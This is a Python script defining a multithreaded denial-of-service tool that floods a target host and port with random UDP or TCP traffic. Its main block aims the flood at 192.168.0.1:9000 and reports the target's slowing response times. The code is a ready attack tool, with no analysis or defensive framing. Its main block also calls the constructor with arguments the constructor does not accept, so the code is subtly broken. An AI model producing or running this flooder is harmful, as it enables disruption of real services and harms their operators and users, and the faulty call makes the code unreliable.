import secrets
import socket
import time
from threading import Thread


class DosPy(object):
    def __init__(self, host: str, port: int) -> None:
        self._host = host
        self._port = port
        self._threads_num = 100
        self._bytes_num = secrets.token_bytes(1000)

        self._stop_thread = False
        self._default_protocol = socket.SOCK_DGRAM

    def set_config(self, threads_num: int = 100, bytes_num: int = 1000) -> None:
        self._threads_num = threads_num
        self._bytes_num = secrets.token_bytes(bytes_num)

    def check_connection_ms(self) -> float:
        conn_check = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        start = time.time()
        conn_check.connect((self._host, self._port))
        end = time.time()

        conn_check.close()
        return end - start

    def is_ready_to_connect(self) -> bool:
        conn_check = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            conn_check.connect((self._host, self._port))
        except OSError:
            return False
        else:
            conn_check.close()
            return True

    def _attack_thread(self) -> None:
        if self._default_protocol == socket.SOCK_DGRAM:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            address = (self._host, self._port)

            while self._stop_thread is False:
                sock.sendto(self._bytes_num, address)
        elif self._default_protocol == socket.SOCK_STREAM:
            address = (self._host, self._port)

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(address)

            while self._stop_thread is False:
                try:
                    sock.send(self._bytes_num)
                except OSError:
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect(address)

    def attack(self) -> bool:
        for __ in range(self._threads_num):
            th = Thread(target=self._attack_thread)
            th.start()

        return True

    def stop_attack(self) -> None:
        self._stop_thread = True


if __name__ == '__main__':
    dos = DosPy('192.168.0.1', 9000, threads_num=100, bytes_num=50000)
    print(f'Normal response time: {dos.check_connection_ms()}')

    print('Start attack...')
    dos.attack()
    print('Started.\n')

    while True:
        print(f'Current response time: {dos.check_connection_ms()}')
        time.sleep(1)
